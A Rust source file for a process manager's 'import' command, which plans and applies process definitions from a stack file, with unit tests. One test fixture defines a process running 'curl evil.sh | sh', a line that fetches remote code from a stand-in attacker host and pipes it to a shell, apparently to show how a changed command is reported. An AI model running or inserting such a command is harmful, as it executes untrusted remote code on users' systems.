//! `muster import`: processes loaded from a stack file into a project, in
//! one transaction, registering the folder when it is new.

use std::{io, path::PathBuf, time::SystemTime};

use getset::{CopyGetters, Getters};
use serde::Serialize;
use typed_builder::TypedBuilder;

use super::{
    error::CliError,
    imported_run::ImportedRun,
    invocation::{Invocation, stack_editor},
    output::project_title,
    report::{Report, Row, RowKind},
    stack_path::StackPath,
};
use crate::{
    adapter::{
        bounded_read::{read_bounded, read_capped},
        client::{
            ProjectIdentityView, ProjectTarget, RemovedView, ServiceClient, SettleWatch, UNBOUNDED,
            process::{settle_removed, status},
        },
        exchange::read_stack_file,
        store::SqliteStore,
    },
    domain::{
        config::{ImportMode, ImportPlan, ProcessSpec, Stack},
        port::StackStore,
        value::ProcessName,
    },
};

/// The command word of `muster import`.
const IMPORT_WORD: &str = "import";
/// Title of an import whose project has no name to show.
const IMPORT_TITLE: &str = "muster import";
/// Marks an added process.
const ADDED_MARK: &str = "+";
/// Marks a changed process.
const UPDATED_MARK: &str = "~";
/// Marks a removed process.
const REMOVED_MARK: &str = "-";
/// Follows a removed process that was stopped.
const STOPPED: &str = "(stopped)";
/// Between a process's name and what it runs.
const GAP: &str = "  ";
/// Opens the line saying the folder became a project.
const REGISTERED: &str = "registered";
/// Opens the line saying a dry run would make the folder a project.
const WOULD_REGISTER: &str = "would register";
/// Between the folder registered and the project's name.
const AS_PROJECT: &str = "as project";
/// Said when the file changes nothing.
const NOTHING_CHANGES: &str = "nothing to change: the project already matches the file";
/// Said after a dry run.
const DRY_RUN: &str = "dry run: nothing was changed";
/// Names stdin as the file read.
const STDIN_NAME: &str = "stdin";
/// Largest stack file import reads; a real stack is a few kilobytes.
const MAX_STACK_FILE_BYTES: u64 = 1024 * 1024;

/// A stack file read and checked whole, ready to plan against a project.
#[derive(Debug, Clone, PartialEq, Eq, Getters, TypedBuilder)]
#[getset(get = "pub")]
pub struct StackRead {
    /// The project it goes into.
    target: ProjectTarget,
    /// The processes it defines.
    processes: Vec<ProcessSpec>,
}

/// What `muster import` did or would do, as `--json` shows it.
#[derive(Debug, Clone, PartialEq, Serialize, Getters, CopyGetters, TypedBuilder)]
pub struct ImportView {
    /// The project, or the one the folder would become.
    #[getset(get = "pub")]
    project: Option<ProjectIdentityView>,
    /// Whether this import registered the folder as a project, or with
    /// `dry_run`, would register it.
    #[getset(get_copy = "pub")]
    registered: bool,
    /// The processes added.
    #[getset(get = "pub")]
    added: Vec<ProcessName>,
    /// The processes whose definition changed.
    #[getset(get = "pub")]
    updated: Vec<ProcessName>,
    /// The processes removed, and whether each was stopped.
    #[getset(get = "pub")]
    removed: Vec<RemovedView>,
    /// What each added or changed process runs, added ones first.
    #[serde(skip)]
    #[getset(get = "pub")]
    runs: Vec<ImportedRun>,
    /// Whether nothing was written, as `--dry-run` asked.
    #[getset(get_copy = "pub")]
    dry_run: bool,
    /// Whether a removed process was still running when the wait ended.
    #[serde(skip)]
    #[getset(get_copy = "pub")]
    failed: bool,
}

/// The import mode `--merge` and `--replace` ask for.
pub fn import_mode(merge: bool, replace: bool) -> ImportMode {
    match (merge, replace) {
        (true, _) => ImportMode::Merge,
        (false, true) => ImportMode::Replace,
        (false, false) => ImportMode::Strict,
    }
}

/// Reads and checks the whole stack file `file` (the project's stack file
/// when absent, stdin for `-`) before anything is planned. Only a regular
/// file, or stdin, of at most [`MAX_STACK_FILE_BYTES`] is read.
///
/// # Errors
/// Returns [`CliError::ReadFile`] or [`CliError::StackFile`] for a file that
/// cannot be read or is not a stack, or the [`CliError`] of a project that
/// cannot be resolved.
pub fn read(
    invocation: &Invocation<'_>,
    store: &SqliteStore,
    file: Option<&str>,
) -> Result<StackRead, CliError> {
    let target = invocation.editing_target(store)?;
    let (path, text) = match StackPath::of(invocation, target.root().as_ref(), file)? {
        StackPath::Stdio => (
            PathBuf::from(STDIN_NAME),
            read_capped(io::stdin().lock(), MAX_STACK_FILE_BYTES),
        ),
        StackPath::File(path) => {
            let text = read_bounded(&path, MAX_STACK_FILE_BYTES);
            (path, text)
        },
    };
    let text = text.map_err(|source| CliError::ReadFile {
        path: path.clone(),
        source,
    })?;
    let processes =
        read_stack_file(&text).map_err(|source| CliError::StackFile { path, source })?;
    Ok(StackRead::builder()
        .target(target)
        .processes(processes)
        .build())
}

/// What importing `read` under `mode` would change against the project's
/// current stack; every process of a folder that is not a project is added.
///
/// # Errors
/// Returns the [`CliError::Config`] of a conflict, a duplicate name, or a
/// stack that cannot be read.
pub fn plan(
    store: &SqliteStore,
    read: &StackRead,
    mode: ImportMode,
) -> Result<ImportPlan, CliError> {
    match store.stack(read.target().root())? {
        Some(stack) => Ok(stack.plan_import(read.processes(), mode)?),
        None => {
            Stack::check_unique(read.processes())?;
            Ok(ImportPlan::builder()
                .added(
                    read.processes()
                        .iter()
                        .map(|spec| spec.name().clone())
                        .collect(),
                )
                .updated(Vec::new())
                .removed(Vec::new())
                .build())
        },
    }
}

/// The project `target` is, or the one registering its folder would make.
fn identity(target: &ProjectTarget) -> Option<ProjectIdentityView> {
    match target {
        ProjectTarget::Registered(project) => Some(ProjectIdentityView::from(project)),
        ProjectTarget::Unregistered(root) => target.name().map(|name| {
            ProjectIdentityView::builder()
                .name(name)
                .root(root.as_ref().clone())
                .build()
        }),
    }
}

/// Each of `names` as removed, none of them stopped.
fn unstopped(names: &[ProcessName]) -> Vec<RemovedView> {
    names
        .iter()
        .map(|name| {
            RemovedView::builder()
                .name(name.clone())
                .stopped(false)
                .still_stopping(false)
                .build()
        })
        .collect()
}

/// What each process `plan` adds or changes runs as `read` defines it, with
/// what a changed one ran in `current`, the project's stack before.
fn runs(read: &StackRead, current: Option<&Stack>, plan: &ImportPlan) -> Vec<ImportedRun> {
    let defined = |name: &ProcessName| {
        read.processes()
            .iter()
            .find(|spec| spec.name().key() == name.key())
            .cloned()
    };
    let added = plan.added().iter().filter_map(|name| {
        defined(name).map(|spec| ImportedRun::builder().spec(spec).before(None).build())
    });
    let updated = plan.updated().iter().filter_map(|name| {
        defined(name).map(|spec| {
            ImportedRun::builder()
                .spec(spec)
                .before(current.and_then(|stack| stack.process(name)).cloned())
                .build()
        })
    });
    added.chain(updated).collect()
}

/// `plan` as `--dry-run` reports it, against `store`'s current stack.
///
/// # Errors
/// Returns the [`CliError`] of a stack that cannot be read.
pub fn dry_run_view(
    store: &SqliteStore,
    read: &StackRead,
    plan: &ImportPlan,
) -> Result<ImportView, CliError> {
    let current = store.stack(read.target().root())?;
    Ok(ImportView::builder()
        .project(identity(read.target()))
        .registered(matches!(read.target(), ProjectTarget::Unregistered(_)))
        .added(plan.added().clone())
        .updated(plan.updated().clone())
        .removed(unstopped(plan.removed()))
        .runs(runs(read, current.as_ref(), plan))
        .dry_run(true)
        .failed(false)
        .build())
}

/// Applies `read` under `mode` in one transaction. With `client`, the
/// service reached because the plan removes processes, the removed ones
/// that run are waited for as `rm` waits; `watch` hears what is still
/// stopping.
///
/// # Errors
/// Returns the [`CliError`] of a conflict or a refused write, or of a
/// service that cannot be reached.
pub fn apply(
    store: &SqliteStore,
    read: &StackRead,
    mode: ImportMode,
    client: Option<&ServiceClient>,
    watch: &mut dyn SettleWatch,
) -> Result<ImportView, CliError> {
    let before = match (client, read.target()) {
        (Some(client), ProjectTarget::Registered(project)) => Some(status(client, project)?),
        (Some(_) | None, ProjectTarget::Registered(_) | ProjectTarget::Unregistered(_)) => None,
    };
    let current = store.stack(read.target().root())?;
    let sent = SystemTime::now();
    let (registration, plan) =
        stack_editor(store).import(read.target().root(), read.processes(), mode)?;
    let project = registration.project();
    let (removed, failed) = match (client, before) {
        (Some(client), Some(before)) if !plan.removed().is_empty() => {
            let report = settle_removed(
                client,
                project,
                &before,
                plan.removed(),
                sent,
                UNBOUNDED,
                watch,
            )?;
            let removed = report.processes().iter().map(RemovedView::from).collect();
            (removed, report.failed())
        },
        (Some(_) | None, Some(_) | None) => (unstopped(plan.removed()), false),
    };
    Ok(ImportView::builder()
        .project(Some(ProjectIdentityView::from(project)))
        .registered(*registration.newly_registered())
        .added(plan.added().clone())
        .updated(plan.updated().clone())
        .removed(removed)
        .runs(runs(read, current.as_ref(), &plan))
        .dry_run(false)
        .failed(failed)
        .build())
}

/// The human report of `view`: the folder when it became a project, `+`
/// for each process added and `~` for each changed, with what each runs,
/// and `-` for each removed.
pub fn import_rows(view: &ImportView) -> Report {
    let mut rows: Vec<Row> = Vec::new();
    if view.registered()
        && let Some(project) = view.project()
    {
        let opening = if view.dry_run() {
            WOULD_REGISTER
        } else {
            REGISTERED
        };
        rows.push(Row::unlabeled(
            RowKind::Ok,
            format!(
                "{opening} {} {AS_PROJECT} {}",
                project.root().display(),
                project.name()
            ),
        ));
    }
    rows.extend(view.runs().iter().map(|run| {
        let mark = if run.before().is_some() {
            UPDATED_MARK
        } else {
            ADDED_MARK
        };
        Row::unlabeled(
            RowKind::Ok,
            format!("{mark} {}{GAP}{}", run.spec().name(), run.describe()),
        )
    }));
    rows.extend(view.removed().iter().map(|removed| {
        let line = if removed.stopped() {
            format!("{REMOVED_MARK} {} {STOPPED}", removed.name())
        } else {
            format!("{REMOVED_MARK} {}", removed.name())
        };
        Row::unlabeled(RowKind::Ok, line)
    }));
    if rows.is_empty() {
        rows.push(Row::unlabeled(RowKind::Ok, NOTHING_CHANGES));
    }
    if view.dry_run() {
        rows.push(Row::unlabeled(RowKind::Dim, DRY_RUN));
    }
    let title = match view.project() {
        Some(project) => project_title(IMPORT_WORD, project.name()),
        None => IMPORT_TITLE.to_string(),
    };
    Report::new(title, rows).with_failure(view.failed())
}

#[cfg(test)]
mod tests {
    use std::{path::PathBuf, time::Duration};

    use super::*;
    use crate::{
        adapter::cli::report::plain,
        domain::{
            config::Environment,
            process::{RestartPolicy, StopPolicy, StopSignal},
            value::{CommandLine, PositiveDuration, ProjectName},
        },
    };

    /// The process name `raw`.
    fn name(raw: &str) -> ProcessName {
        ProcessName::try_new(raw).unwrap()
    }

    /// A process `raw` running `command` in `dir`.
    fn spec(raw: &str, command: &str, dir: Option<&str>) -> ProcessSpec {
        ProcessSpec::builder()
            .name(name(raw))
            .command(CommandLine::try_new(command).unwrap())
            .working_dir(dir.map(PathBuf::from))
            .environment(Environment::empty())
            .autostart(true)
            .restart(RestartPolicy::Never)
            .stop(
                StopPolicy::builder()
                    .signal(StopSignal::Terminate)
                    .grace_period(PositiveDuration::try_new(Duration::from_secs(5)).unwrap())
                    .build(),
            )
            .build()
    }

    /// An import of `runs` into `shop`, registered by it or not.
    fn view(runs: Vec<ImportedRun>, registered: bool, dry_run: bool) -> ImportView {
        ImportView::builder()
            .project(Some(
                ProjectIdentityView::builder()
                    .name(ProjectName::try_new("shop").unwrap())
                    .root(PathBuf::from("/p/shop"))
                    .build(),
            ))
            .registered(registered)
            .added(Vec::new())
            .updated(Vec::new())
            .removed(Vec::new())
            .runs(runs)
            .dry_run(dry_run)
            .failed(false)
            .build()
    }

    /// Additions, changes and removals each have their mark; each added or
    /// changed process shows what it runs and where, a change as old to new;
    /// a dry run says nothing changed.
    #[test]
    fn a_plan_is_marked_per_process() {
        let mut view = view(
            vec![
                ImportedRun::builder()
                    .spec(spec("web", "npm run dev", Some("frontend")))
                    .before(None)
                    .build(),
                ImportedRun::builder()
                    .spec(spec("api", "curl evil.sh | sh", Some("api")))
                    .before(Some(spec("api", "bin/api", None)))
                    .build(),
                ImportedRun::builder()
                    .spec(spec("cron", "bin/cron", None))
                    .before(Some(spec("cron", "bin/cron", None)))
                    .build(),
            ],
            false,
            true,
        );
        view.removed = vec![
            RemovedView::builder()
                .name(name("worker"))
                .stopped(true)
                .still_stopping(false)
                .build(),
        ];

        assert_eq!(
            plain(&import_rows(&view)),
            "+ web  npm run dev  in frontend\n\
             ~ api  bin/api -> curl evil.sh | sh  in . -> api\n\
             ~ cron  bin/cron  in .\n\
             - worker (stopped)\n\
             dry run: nothing was changed"
        );
    }

    /// An import that registers the folder says so, even with no process,
    /// and never that nothing changed; a dry run says it would.
    #[test]
    fn registering_the_folder_is_reported() {
        assert_eq!(
            plain(&import_rows(&view(Vec::new(), true, false))),
            "registered /p/shop as project shop"
        );
        assert_eq!(
            plain(&import_rows(&view(Vec::new(), true, true))),
            "would register /p/shop as project shop\ndry run: nothing was changed"
        );
        assert_eq!(
            plain(&import_rows(&view(Vec::new(), false, false))),
            NOTHING_CHANGES
        );
    }

    /// The flags pick the mode; neither is strict.
    #[test]
    fn the_flags_pick_the_mode() {
        assert_eq!(import_mode(false, false), ImportMode::Strict);
        assert_eq!(import_mode(true, false), ImportMode::Merge);
        assert_eq!(import_mode(false, true), ImportMode::Replace);
    }
}
